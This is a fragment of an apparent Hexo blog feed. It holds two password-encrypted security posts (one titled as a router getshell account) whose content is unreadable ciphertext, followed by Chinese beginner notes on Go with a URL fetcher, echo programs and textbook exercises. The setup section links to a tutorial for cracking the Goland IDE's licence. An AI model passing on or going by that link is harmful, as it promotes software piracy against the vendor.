bdf1c8f90719e1b5c39023485fc5f55301ea322f802e6854cbf261fd539c7b8e92eada304d5fa38748be799807191f47412e12bb20b5a93d6cdb8c8317b9d799c5490ce09117709c5bce5b5de00a2c6ce754a9f0e7429729949a4edf59370baaa3be2090036a268d392410532d394c6eba769b7e488d2473001153ef9f533abd6467bca3a4f023552f8a7f4f235491e0f08ea5c0589036edb1005250cad548423f9600e3c21b5e09883768073cfc770702297d254dfa23982b04dd1cfee6a046caefdb3ed7eeb78edaef46a446fe4e939c80b6b8f0634e96ba6b6f9747c2c1e1354a8c392cf8dbaafdd58b8135468778417abd333bb6e6f4159704e8f564da4606a30295efea5a2e7fedd71bcd41a045d8f75b17a994ba59632ea821297a700d08671be6e4b4feeab4068a92f4c1f57fb521cb6b0a349880c2fc2a06a5e4e531e8739509d42f85fa83e41683c6f2d3931afe4316b51b4eb7eb0d9698fb96a209612c5c5d57cdfb2445a1067594495e1bb78fc5796d402ab98cdc3cb673011782e4b48a350bf9ab36b7d17ace6085ba1854f9fada86cda1ae28b4c31dc30be556a1cbaefc37a7b6b5a07c1c774cd9cc83bb57970ce73511b09a95c84d01f37efcf3031ba776059e6bcfbdad0e9c6533beef379cf26cccb74ed9bb81f39a6129dd6326288f3da2</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>SRC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SRC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一次路由器Getshell经历</title>
    <link href="/2023/08/29/%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8Getshell/"/>
    <url>/2023/08/29/%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8Getshell/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="2db60c62ba31c3563b1355b737e01d321fb2fd19a1ee792ba239afdca7d9b9c5">80f7af2430a3dce6996ee26d1569b238d40224290ffd561b4853cf1c5c8fc0fb1ae1b2792b0aebc458676a0127b1f2755e196e67272033764689b6809df9a7b03db1594726910f766e8d310b2cd738179b77123609ea3ac3853841c1d992d6404f0be7b3a89dc0bc394f03749b778ea6a4ce5cae506f98ae138d688dd6ae099738c08bd7c3b3cadd7f1c00894e101855204c6fcbbe481172306c201b09201cd2092f399e202f182400dd7236874c3a1ad60930d98078729c93ed58b03e01c1a521323f334e1b5e7789a35a6c511fa3c0d02b82db66ebc1cdded20f094e14e816f7b4dcbdf3fb9542e8ef5f6f37c75b15cec474b547767e27a4a2459866418b6929b949ac7ad69a4c9a13a96ba3ab0a4854d70b0e88b29257ba3ceee8d32c8131a8d2aabe4ac8a0d66fc478d5a6e0982254dcec8d5eb0e5cf98dd9c2f13cc2a06fe814278694878f51a72fe4ce0ffd402b341a6f8e1698b60bd1cbb0cf3212cb18b9cfa3e466ae810a3d0ad7a22e73e3ca1fd8abee3eff0a30ca04e922ce1313bfca3a1c21c82488a4d896492757c0c4b00cff10ccbd4ea3900ae7d3035e9f443203f2b99cf0403eb65e5dd13735a047dfe3126f77c4a5efc5e3bd86d33f252d4f3f158f29f9f3f25271b5cf4d99f70fce5e0ce74f036f094f44250a504c47954cb92d10662e6a7bf9f02e4c6d00832dcc89a0a0f78339c1d4450019f3f2bc76d6581e6d6cbf86560dabe1cd5da2f778737e8f9895e21079e468fa28ccca54562d279b9efa5dd4987f364c769c010f02ed0a6a81bd4a46ad8a180e0cc2f38813a579b4f9f9ff6970910b5300f85cdc12e1b3142326e7e057923778da692dd7d5a3a32c43fe4c9bdf2f93415081ffc4ae3ed432c60d970645d107a85d00bb8054c868c644bdb68969b2ad4cc90c3faee0f02921834c34c32082497002facd90f76026492baf804e0bd2382dc838dc0c870a31c3f01713260404d211b56f3d797caee122babf1f62d83a2a81c43a656761f96c8377540344b3bde0d4c4ced2d49860b0e808217ac0fa245c50f6088caeb6d32a20330052cfc6a8caaecb054bb338e03df00ca034fb3403131b8791b47e913cd31f63e3b825831a9ed3199eb5f2f15e0a35555bff37ec2223a582b11f510fd39e4be8ea2d8e68e80478584e3f569d0823a1ec5c78cb527c02efa3b8eab587170be47181cc15d95b419382be674e2630c7e58f6fec2f7e2e6fea1d8116ad298fd61c37916a958b7b2218270992b04e8620e2ded1b3d4afaf96bdf391e002ef9a418d11cd76f53da50d9529c2f9e33399830b5c4669ac3f44ae771399975ff4ac0fc65677c9eec332b8f42ea9e0b6263f36b97ead2bc723d9160d3744cae6bad0d5ef928b27318ceb85a1a2652cb63ba54141f3469e87bca343e2e06735c15c42a858724036ffb5fd476b05a1a41f2e4d00db8ab96c8f5967cf1b38d266b0453cc8cc753caeb74d23ac28b08a536ca169333bc785b8793ccd6a7e6487f7a277f32adfbc95f9f6d3717718fbd4c2fa9b84415aefa874bf20caedef78b990222fe5f5a6f078777be8143504a72cc7ab90fd204005db18ae6d158da4e3fe7576db268bc00e0379ed34c804984c93e46564ed7219f8864b136cfcdb8cdab27adec1a65051587a3822ec45002ac47e65aa42341e4b4add4a519dabc06ff49469427a01562cb3398fc5869e54f3806c3b51383d05328dfae57096efc41455c02792591035c9d0d35071743b8af1da318a0f545133386c903a9a28108e9b993fd0d75f4527d5377cc55ddab3725a9d0e2f3dacf5b158020e864b61ee3cbfa41fb3c4eb117c685e6bdcd64d1118fc9aa346f77e18532f0aacc953299c9930971a372dc7e96811f1d14ba48b71da02f0857bb3722473d69a7fdd04e1cf0224128b35211b37fab4d98c6fd78ab6d71b86df70ce64dfd3e2bd8dfea28627e35dd97675949a965009cf7393d447e8b1fd550174526dfa9e28d273cdecbdf435e0a9f38d1d21a5ede7d87b2ca458d4ad5aff7924dd9303a9e44b9d95d1591c32e2268bc3a5ec47b5d4f7a134cae772e8c5f21664c69b1a9ea5b36660ec1b7fd6376c61e819d5250e4d78e386289c5eb6abe1709d54949a81bc75ffa12abea06609b72259786cf4367c16b574640921547573019117e5ede90171f6bd196f08effb6408907fdb497407cfe254631379397ef0149eaa50e1c3e6c502e078d37c354662941459de3c396e18f8e0d969683b538e70011180b96462f248398a51b87b529edcee3ff06615364d6e3d1cf6aaf91d2988c24562212d5963935b198112be4f4854f0ca11b2c44e9c89735efff58892b0efcb07e5d9576d2e387b255c0227bb9792b01d18157197ef858d7d35064dc1ec7303903b17b58149e76aa487ac766b94047e058f895609ce9c3dfd36570b058a22c79e17899d11b9dbf0337e14dee56c531e73fc82255970436aac294e9419519aaabbeed1c4cb356f02328a42c90756b85145e379c0bd0e4183342d5ae87b18a7381d60bac78a3cf0e6a95f258dfcf09f9b0a4e0e264f360095d1374482a45b49b6f4d36c481053f475a59a74a9c90fa54524f9fab6cf062fab0300f06a88cd0b3b4ea6360544aecfc01e9d70db275e77cbbebd71e290727251a92e6ac3ac597919ae6350500112bed9e09e609097b2af149f56387c5d6a4ade41458b15af8bc4deb35bc3d3719cab8bcd2decc14c4b7ef9e0a937df665654332a4d503d18d0e45ae1bde416eba8e0a3e4e8053cd8fdd683d39655937edd105d173d70d010f464a07cfbe9314496f56414cb6c8f04b0f94fb80ee0d47e9c4aea342ff532eb845db6f315de773ec55af6e523c838ebc566a630939abc9ecd044ac18c70b67a5267daa135f7fe36d9b13f1ab132ce4747d40a73372861efa8f31b33748a0cef86b8172ef3d42e1b2eb2440d3406b210de5fe2e211238de335e3018b4c507b1a567c30fcfbec6ce6054613967fc73dfe2dbf481896ec5e003b50f366851fca5b551a5ca2b32bed334064949a600805220ae4f3af6e82acd3133ec35610ed6ff7791d7c41d62b200d93e1018be644170b56a8263162d012ed5b5943482e360cd89773096cc066a1c5ee19bde8c9bb347c1455c0b6e14785d4f9bdaa27630ce57d93361a8aabe173984d0911237f3a20e68669b5658dd7e954bb965eea1064daec3bec3c19d83941d9e2f1b3aebad0d869807d0cd6358d3eff197578799d39dab41a120ccf4e77a71a2a06cd47a196f4ce8da2101c65ff7ab1178ce9b37fe04416c6273990a8aef87471adb06eb4729a32d11d56381cb259305fb6a7fde2fe87f11c976b5eb953a0ad6fd0b3b0058281dfeaed3ab3de683ce5059f40e7b229e2da0efafd4eab8afe9aef351617993addf274c0960f1391dcf010fcc3e916a6af78cf08f8ca41ec3349311e78b17442edfbaee2bd22487c435701c2ee4c22c85bc138cf65a2c20ac48759830ca86f9ae3ff9f1056a1cd06f8058b21ae46a86e7d6707aaee387e094a85dae6ccd83b7db6331977a6cd03eb5c832a36f646bc26f0069c9ea3b5d522c56194a73e8edd4575aa2ded4da7d0cc92ac255ad44f939808b2b67aabe3dff24b97ca0c0067b5f73ccc2c2246d6f535adba817e8081b1f9eceae594c3e44e1691e0ce16b4481aafb21fb8f257a13a491ee3529a5613166fa299434e9d5d6e4c959ad0c3e76021eab4fef95808329bfdf2a81c136f85321d34c0b21e7231929bde1bd864ed31fcb00339d5a232344503b42230973247e2353c625ba8138daabbde266d522bac8c0914ad693f737b4d303db18ddd5622f353f7e9b49a4ccbf55df37d586ea429c4be53a2cf9cae5111a60b8547390043064fd4efd8640622f8b65881b3bb7cfc1c112289aeb1e9bba76017c9df91fb18687ee5324d23022b9dc59e17db580860ef3e98c6a7424eb5fd4d67da7abb7b69a6dadf1eae5166ddd77bb9e4ee1c419346db1590139ddc6cbb060341f2eb90bd197272e9aabfc32f629f52eaedf6d9cb5ba16e6d6014851011b9c129ea1db18e7f793e3e9272c0e2ba6a6d2ca697e1d86ce679af783ef8a7349f5de941a5cfa7ecd58edda1741d817da71b6d5a8b83603125f3e0b1313f90db2b430fd6e7c5ef83842728165d266c211ff9f9e0523b9bb3f216fa7df417c93a372a74d2e294702b155057a210903ccae5042a3e51aa7b7be5b363017a8c8ef5dbf58dd17ed0071b2eb26207542b463e40075384fb90b4a8ec7c841d30d09e4ea946c86ab2b1a4015fe43306c5cf8a6bcd049780e404352edfc7d51c0b4f9bb777bcb36d81d78001a3fb15e10a487481a106db76b18cf9ffafd7ef4c62d51f09aebdeead47691db1ba7feffd1ae7ca749f0b91efa85d59884842c5a9bd3a0ad3c61b5f0e0ed3e763251359f81b8494a5d9732047fe5f13ed87c7e673aaad401b77d4b0dcf0f145138d9c851c3908ecd7c6998238f016e7fde74c4fd0555bf546cdee35609aaeb75e4bc8cf4d35aac58e7593c3c3e05ba4ec72fa345af4994df053078ff1100973de22b208ef0f4cd050c3fa5d94791c1e54a74762eff4c67f81413d147f370e88b6892ab841ece2e7f8a4f9dd64bcffb14213b9c7c17c55c39885212f45259eb10a108a0814f128609ef85ff98d0b0a13fd8ca3809bc62e1801ff36779ee55f869c06ac6e964d961080ba43d8ad9989ac0c3bc9c879abf9344db18a7aeaa74abd43e20e86e3dab75834973da6068e3b15e3df32138aecffdb2cae4c82695b3ae825a7d9b8ddceb9a4bf0ec7cd118a38bd63776d2883e7d50daa78496f4c4a9fc6f8348b07854721cbff99a6001bd8af7aa0fd7a1693eb6adad6511c2556a7fec09e461104372dc95b8e5e28e08ba6c52e27ca0be867027a91925a766b60ca9cd2352cb293a8aa60583692e051a34e1b04e25d98e42837fb94286f5450439bc01cf7d91c582156ba68edad04dfb240a23a37ddc7baae293be587df690c680c1f717271255ad5719e72d7399c5297f2fd8ea5ac41e06c8c31179c904d605f80ec07f3c22ef731c3647ab365f9dec384a1e571acd89419bc5366f5805e77392c19a271b3d5647d2347376c043630e2a780fb049c20938755559e60a593dc6162d3d0e5e7c293558cc344eec0e2e608694090588769b85aaff00b0a19f4a05d4f70dd6c7d1fce2748534121a9126428c4dc12e293471e2d82841f1e4dd0a4b2cc6f6e404134d706d87b7f783093e47f992a65e138f8baa16e92d2d75b60e2f23bada275b926b394af67ecc4e421b22b0c707b8d06fcdda1fcd747dea5ab9bbaebc337fff7fa82b8dc148dd8f12bef790a1665a64c0ef770f7d3f4a4f3c671f6b411b15ac793a4efc68d4bc59ba97ce410e8f4abd9031fc29aed12e47751aa1a4af01c1967db60f187ad00e3e5c194c2abf04bef66c0553023a537abcfc548a2ab4b8fabaaced5003401f62e9457a61218658c0779f381493591e20e1c61ef53f2cfd14001637e9c2660d021ac17d2f0d5a5ca527f36350f2c36ccd473351be8bfd6f646cfba5d2a74995efba341fa4ba07a22993c536b4a1067898bc6b2c75fd82e32050e83587556634550cc2f79754b3c312964cd439d7f7685957fed7e4e9f2306bc68eb289db3f6644ffab6b9f5a54132a11835ba931b38eb356fa8d4feaedddbeae153f83fae04823128ecca05ad059c10f59ace8ffcedf3d1d6cbe832ef33c718235c2dd00073d95f9ce999ff978fcada1f2b3cb140f7a2c20b3367054efec0477b30b127159b9fb27c6a1c5f5224b1bbbb229593624d8ad5fec4fae8053920afa10f85de3009a45883b6c805c2f1ff39efe0211d73d164294d46cae49e814bdcd883ca020f95de4b1c436a95e197e1ca78c54f2c944b75c91c2f12d4b78854daac4196ebf86860bcc14bd2c882deb1bf57a7f625dee3ca33834448270c6e1b5c39dcfc03ff8c505ce295e0ce545a4337b97295bd97b11843e1da082997e9ff1f1fa1f4eefa9352a872689bb3ef14031e14e7b84fbb39be35ad2dfc1f71ede9e9e720571cea1c97febb1ce9afac04e7d2a9a1918a1330915d0cf6ab8ba849a593b278710d7d10846c50ec67c6619b25055194e0c5c1600512e8e1d99df9a728874240c9e2fe623b6b1fdc426e6ea027fc5a823e9e147227c4a2450db03ebb9a73cb24d86b5c9899069ae1eb7569072e4a5d137a290a7fe1d114b18af2f5ab46747f436c4e86aff1122cfaa36dc3d6452a0d523b7e8267ccb69</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>SRC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SRC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GO学习笔记</title>
    <link href="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>跟着《GO圣经》学习GO啦！</p><span id="more"></span><h3 id="Go的优势"><a href="#Go的优势" class="headerlink" title="Go的优势"></a>Go的优势</h3><ul><li><p>简单易学</p></li><li><ul><li>Go语言的作者都有C的基因，Go自然而然也有了C的基因，但是Go的语法比C还简单, 并且几乎支持大多数你在其他语言见过的特性：封装、继承、多态、反射等</li></ul></li><li><p>丰富的标准库</p></li><li><ul><li>Go目前已经内置了大量的库，特别是网络库非常强大</li><li>前面说了作者是C的作者，所以Go里面也可以直接包含c代码，利用现有的丰富的C库</li></ul></li><li><p>跨平台编译和部署</p></li><li><ul><li>Go代码可直接编译成机器码，不依赖其他库，部署就是扔一个文件上去就完事了. 并且Go代码还可以做到跨平台编译(例如: window系统编译linux的应用)</li></ul></li><li><p>内置强大的工具</p></li><li><ul><li>Go语言里面内置了很多工具链，最好的应该是gofmt工具，自动化格式化代码，能够让团队review变得如此的简单，代码格式一模一样，想不一样都很困难</li></ul></li><li><p>性能优势: Go 极其地快。其性能与 C 或 C++相似。在我们的使用中，Go 一般比 Python 要快 30 倍左右</p></li><li><ul><li>语言层面支持并发，这个就是Go最大的特色，天生的支持并发，可以充分的利用多核，很容易的使用并发</li><li>内置runtime，支持垃圾回收</li></ul></li></ul><h3 id="Go环境搭建"><a href="#Go环境搭建" class="headerlink" title="Go环境搭建"></a>Go环境搭建</h3><h4 id="Goland下载安装"><a href="#Goland下载安装" class="headerlink" title="Goland下载安装"></a>Goland下载安装</h4><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Snipaste_2023-08-15_19-49-47.png" class=""><p><a href="https://www.jetbrains.com/go/download/other.html">Goland各版本下载</a></p><p><a href="https://chenjunan.top/detail/Detail?id=37">Goland破解教程</a></p><h4 id="Go语言安装"><a href="#Go语言安装" class="headerlink" title="Go语言安装"></a>Go语言安装</h4><p><a href="https://go.dev/dl/">官网地址</a></p><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Snipaste_2023-08-15_19-51-26.png" class=""><p><code>go version</code>查看是否安装完成</p><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Snipaste_2023-08-15_19-55-52.png" class=""><h3 id="开始GO-——Part1"><a href="#开始GO-——Part1" class="headerlink" title="开始GO!——Part1"></a>开始GO!——Part1</h3><p>笔者跟着《Go语言圣经》一起学习的~~😘</p><p>对应第一章</p><h4 id="编写第一个GO程序"><a href="#编写第一个GO程序" class="headerlink" title="编写第一个GO程序"></a>编写第一个GO程序</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">"fmt"</span><br><span class="hljs-string">"io/ioutil"</span><br><span class="hljs-string">"net/http"</span><br><span class="hljs-string">"os"</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {<br><span class="hljs-comment">// 通过循环遍历命令行参数中的每个URL</span><br><span class="hljs-keyword">for</span> _, url := <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] {<br><span class="hljs-comment">// 使用HTTP GET请求获取URL的响应</span><br>resp, err := http.Get(url)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<br><span class="hljs-comment">// 如果发生错误，将错误信息输出到标准错误流并退出程序</span><br>fmt.Fprintf(os.Stderr, <span class="hljs-string">"fetch:%v\n"</span>, err)<br>os.Exit(<span class="hljs-number">1</span>)<br>}<br><br><span class="hljs-comment">// 读取响应体的内容</span><br>b, err := ioutil.ReadAll(resp.Body)<br>resp.Body.Close()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<br><span class="hljs-comment">// 如果在读取过程中发生错误，将错误信息输出到标准错误流并退出程序</span><br>fmt.Fprintf(os.Stderr, <span class="hljs-string">"fetch: reading %s: %v\n"</span>, url, err)<br>os.Exit(<span class="hljs-number">1</span>)<br>}<br><br><span class="hljs-comment">// 将获取到的内容输出到标准输出</span><br>fmt.Printf(<span class="hljs-string">"%s"</span>, b)<br>}<br>}<br></code></pre></td></tr></table></figure><p>在命令行里执行<code>go run .\Hello.go http://gopl.io</code>，得到返回包，说明你的Go语言环境已经完全搭建成功啦！</p><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Snipaste_2023-08-16_12-43-23.png" class=""><h4 id="命令行参数"><a href="#命令行参数" class="headerlink" title="命令行参数"></a>命令行参数</h4><p><code>os</code>包提供一些与操作系统交互的函数和变量，程序的命令行参数可以从<code>os</code>包的Args变量获取。</p><p><code>os.Args</code>变量是一个字符串的切片，区间索引时，同样是<strong>左闭右开</strong></p><p><code>os.Args</code>的第一个元素，<code>os.Args[0]</code>, 是命令本身的名字；其它的元素则是程序启动时传给它的 参数。s[m:n]形式的切片表达式，产生从第m个元素到第n-1个元素的切片。如果省略切片表达式的m或n，会默认传入0或 len(s)，因此切片可以简写成os.Args[1:]。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><span class="hljs-comment">//测试程序</span><br><span class="hljs-keyword">import</span> (<br>   <span class="hljs-string">"fmt"</span><br>   <span class="hljs-string">"os"</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {<br>   <span class="hljs-keyword">var</span> s, sep <span class="hljs-type">string</span><br>   <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt; <span class="hljs-built_in">len</span>(os.Args); i++ {<br>      s += sep + os.Args[i]<br>      sep = <span class="hljs-string">" "</span><br>   }<br>   fmt.Println(s)<br>}<br></code></pre></td></tr></table></figure><p>对于上面的程序，我们可以有如下理解：</p><ul><li><p>GO里面注释使用<code>//</code></p></li><li><p>GO初始定义的变量若是没有赋值，则隐式地被赋为零值，数值类型是0，字符串类型是空字符串””</p></li><li><p>对于string类型的变量，<code>+</code>号可以直接连接字符串</p></li><li><p>循环变量<code>i</code>没有定义类型，是因为。<strong>符号<code>:=</code> 是短变量声明的一部分</strong>, 这是定义一个或多个变量并根据它们的初始值为这些变量赋予适当类型的语句</p></li><li><p>GO中<code>i++</code>是语句，不是表达式，所以不能用于赋值，**<code>j=i++</code>非法<strong>，而且<code>++</code>和<code>--</code>都只 能放在变量名后面，因此</strong><code>--i </code>也非法**</p></li><li><p>GO中只有<code>for</code>一种循环语句，但有多种形式</p><ul><li><p>第一种：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> initialization; condition; post{<br>    <br>}<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">for 循环三个部分不需要括号包围，左大括号必须与post同一行</span><br><span class="hljs-comment">initalization如果存在，必须是一条简单语句。即，短变量声明、自增语句、赋值语句或函数调用。</span><br><span class="hljs-comment">condition 是一个布尔表达式（boolean expression），其值在每次循环迭代开始时计算。如果为 true 则执行循环体语句。</span><br><span class="hljs-comment">post语句在循环体执行结束后执行，之后再次对conditon求值。condition 值为 false 时，循环结束</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure></li><li><p>省略：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// a traditional "while" loop</span><br><span class="hljs-keyword">for</span> condition {<br><br>}<br><span class="hljs-comment">//上面就是省略了初始化和post，变成了熟悉的while循环</span><br></code></pre></td></tr></table></figure></li><li><p>使用<code>range</code>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> _, arg := <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] {<br>s += sep + arg<br>sep = <span class="hljs-string">" "</span><br>}<br><span class="hljs-comment">/*for 循环的另一种形式, 在某种数据类型的区间（range）上遍历，如字符串或切片。</span><br><span class="hljs-comment">大多数程序员都这么写for循环</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>每次循环迭代，range产生一对值：索引以及索引对应的元素值<br>但是我们这个例子不需要索引，而<strong>range的语法要求：要处理元素，必须处理索引</strong><br>而且<strong>GO不允许使用无用的局部变量，会编译错误</strong><br>解决方法是使用空标识符<code>_</code>，<strong>空标识符可用于任何语法需要变量名但程序逻辑不需要的时候</strong></p></li></ul></li><li><p>声明一个变量有好几种方式，下面这些都等价：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go">s := <span class="hljs-string">""</span><br><span class="hljs-keyword">var</span> s <span class="hljs-type">string</span><br><span class="hljs-keyword">var</span> s = <span class="hljs-string">""</span><br><span class="hljs-keyword">var</span> s <span class="hljs-type">string</span> = <span class="hljs-string">""</span><br></code></pre></td></tr></table></figure></li><li><p>一个简洁的写法，使用strings包的Join函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{<br>    fmt.Println(strings.Join(os.Args[<span class="hljs-number">1</span>:],<span class="hljs-string">""</span>))<br>}<br></code></pre></td></tr></table></figure></li></ul><h4 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h4><h5 id="练习-1-1"><a href="#练习-1-1" class="headerlink" title="练习 1.1"></a>练习 1.1</h5><p>修改 echo 程序，使其能够打印 os.Args[0] ，即被执行命令本身的名字。 </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">"fmt"</span><br><span class="hljs-string">"os"</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {<br><span class="hljs-keyword">var</span> s, sep <span class="hljs-type">string</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">len</span>(os.Args); i++ {<br>s += sep + os.Args[i]<br>sep = <span class="hljs-string">" "</span><br>}<br>fmt.Println(s)<br>}<br></code></pre></td></tr></table></figure><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Snipaste_2023-08-16_13-47-33.png" class=""><h5 id="练习-1-2"><a href="#练习-1-2" class="headerlink" title="练习 1.2"></a>练习 1.2</h5><p>修改 echo 程序，使其打印每个参数的索引和值，每个一行。 </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {<br><span class="hljs-keyword">for</span> n, arg := <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] {<br>fmt.Printf(<span class="hljs-string">"%d %s\n"</span>, n, arg)<br>}<br>}<br></code></pre></td></tr></table></figure><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Snipaste_2023-08-16_13-51-04.png" class=""><h5 id="练习-1-3"><a href="#练习-1-3" class="headerlink" title="练习 1.3"></a>练习 1.3</h5><p>做实验测量潜在低效的版本和使用了 strings.Join 的版本的运行时间差异。（1.6 节讲解了部分 time 包，11.4节展示了如何写标准测试程序，以得到系统性的性能评测。）</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {<br>   start := time.Now()<br>   <span class="hljs-comment">//测试一</span><br>   <span class="hljs-comment">//for _, arg := range os.Args[1:] {</span><br>   <span class="hljs-comment">// fmt.Printf("%s ", arg)</span><br>   <span class="hljs-comment">//}</span><br>   <span class="hljs-comment">//测试二</span><br>   fmt.Println(strings.Join(os.Args[<span class="hljs-number">1</span>:], <span class="hljs-string">" "</span>))<br>   secs := time.Since(start).Seconds()<br>   fmt.Printf(<span class="hljs-string">"花费：%.8fs"</span>, secs)<br>}<br></code></pre></td></tr></table></figure><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Snipaste_2023-08-16_14-02-15.png" 